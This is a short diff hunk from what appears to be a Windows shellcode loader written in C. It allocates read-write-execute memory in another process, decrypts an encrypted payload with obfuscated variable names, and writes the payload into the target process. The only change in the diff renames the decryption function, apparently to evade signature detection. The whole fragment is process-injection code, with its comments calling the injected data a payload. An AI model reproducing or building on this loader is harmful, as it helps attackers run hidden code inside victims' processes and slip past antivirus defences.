@@ -46,7 +46,7 @@ int main() {
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     // Decrypt the payload
-    encaeshell((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
+    encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
 
     // Write payload to target process
     WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
